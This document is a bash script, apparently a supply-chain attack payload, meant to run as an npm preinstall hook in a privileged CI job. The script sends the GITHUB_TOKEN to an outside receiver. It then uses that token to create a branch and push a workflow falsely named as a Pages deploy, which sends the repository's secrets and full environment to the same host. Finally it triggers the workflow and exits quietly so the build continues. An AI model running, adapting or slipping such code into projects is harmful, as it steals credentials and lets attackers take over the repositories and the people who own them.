#!/bin/bash
# payload.sh — Runs during npm ci preinstall in the privileged build job
# GITHUB_TOKEN is automatically available in the environment (write-all)

RECEIVER_URL="https://sap-test-receiver-production.up.railway.app/collect"
REPO="delsoup455/architecture-center-test"
BRANCH="tmp-exfil-$(date +%s)"
API="https://api.github.com"
AUTH="Authorization: token $GITHUB_TOKEN"

# --- Phase 1: Send GITHUB_TOKEN to receiver ---
curl -sf "$RECEIVER_URL?stage=github_token&token=$(echo $GITHUB_TOKEN | base64 -w0)" || true

# --- Phase 2: Create a new branch (no harm to existing branches) ---
# Get the SHA of the joule-integration branch to base our new branch on
BASE_SHA=$(curl -sf -H "$AUTH" "$API/repos/$REPO/git/ref/heads/joule-integration" | python3 -c "import sys,json; print(json.load(sys.stdin)['object']['sha'])")

# Create the new branch
curl -sf -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/refs" \
  -d "{\"ref\":\"refs/heads/$BRANCH\",\"sha\":\"$BASE_SHA\"}" || true

# --- Phase 3: Push a secret-dumping workflow to the new branch ---
# This workflow ONLY dumps secrets — no build, no deploy, no side effects
WORKFLOW_CONTENT=$(cat <<'WORKFLOW_EOF'
name: Deploy main site to GitHub Pages

on:
  workflow_dispatch:

jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate
        env:
          PAASAPCOM_PAT: ${{ secrets.PAASAPCOM_PAT }}
          VALIDATOR_API_URL: ${{ secrets.VALIDATOR_API_URL }}
          BACKEND_API_URL: ${{ secrets.BACKEND_API_URL }}
          EXPRESS_BACKEND_URL: ${{ secrets.EXPRESS_BACKEND_URL }}
          VALIDATOR_RULES_API_URL: ${{ secrets.VALIDATOR_RULES_API_URL }}
          VALIDATOR_OAUTH_AUTH_URL: ${{ secrets.VALIDATOR_OAUTH_AUTH_URL }}
          VALIDATOR_OAUTH_CLIENT_ID: ${{ secrets.VALIDATOR_OAUTH_CLIENT_ID }}
          VALIDATOR_OAUTH_CLIENT_SECRET: ${{ secrets.VALIDATOR_OAUTH_CLIENT_SECRET }}
          CHECK_SPELLING: ${{ secrets.CHECK_SPELLING }}
        run: |
          curl -sf -X POST "RECEIVER_PLACEHOLDER" \
            -H "Content-Type: application/json" \
            -d "{
              \"stage\": \"full_dump\",
              \"env\": \"$(env | base64 -w0)\",
              \"paasapcom_pat\": \"$(echo $PAASAPCOM_PAT | base64 -w0)\",
              \"validator_oauth_client_id\": \"$(echo $VALIDATOR_OAUTH_CLIENT_ID | base64 -w0)\",
              \"validator_oauth_client_secret\": \"$(echo $VALIDATOR_OAUTH_CLIENT_SECRET | base64 -w0)\",
              \"validator_oauth_auth_url\": \"$(echo $VALIDATOR_OAUTH_AUTH_URL | base64 -w0)\",
              \"validator_api_url\": \"$(echo $VALIDATOR_API_URL | base64 -w0)\",
              \"validator_rules_api_url\": \"$(echo $VALIDATOR_RULES_API_URL | base64 -w0)\",
              \"backend_api_url\": \"$(echo $BACKEND_API_URL | base64 -w0)\",
              \"express_backend_url\": \"$(echo $EXPRESS_BACKEND_URL | base64 -w0)\",
              \"check_spelling\": \"$(echo $CHECK_SPELLING | base64 -w0)\"
            }"
WORKFLOW_EOF
)

# Replace the placeholder with actual receiver URL
WORKFLOW_CONTENT=$(echo "$WORKFLOW_CONTENT" | sed "s|RECEIVER_PLACEHOLDER|$RECEIVER_URL|g")

# Base64-encode the workflow for the GitHub API
ENCODED=$(echo "$WORKFLOW_CONTENT" | base64 -w0)

# Get the current SHA of deploy-manual.yml on the new branch
FILE_SHA=$(curl -sf -H "$AUTH" "$API/repos/$REPO/contents/.github/workflows/deploy-manual.yml?ref=$BRANCH" | python3 -c "import sys,json; print(json.load(sys.stdin)['sha'])")

# Update the file on the new branch
curl -sf -X PUT -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/contents/.github/workflows/deploy-manual.yml" \
  -d "{
    \"message\": \"update workflow\",
    \"content\": \"$ENCODED\",
    \"sha\": \"$FILE_SHA\",
    \"branch\": \"$BRANCH\"
  }" || true

# --- Phase 4: Trigger workflow_dispatch on the new branch ---
# Small delay to let GitHub register the updated workflow
sleep 3

curl -sf -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/actions/workflows/deploy-manual.yml/dispatches" \
  -d "{\"ref\":\"$BRANCH\"}" || true

# Send confirmation
curl -sf "$RECEIVER_URL?stage=payload_complete&branch=$BRANCH" || true

# Exit 0 so npm ci continues
exit 0
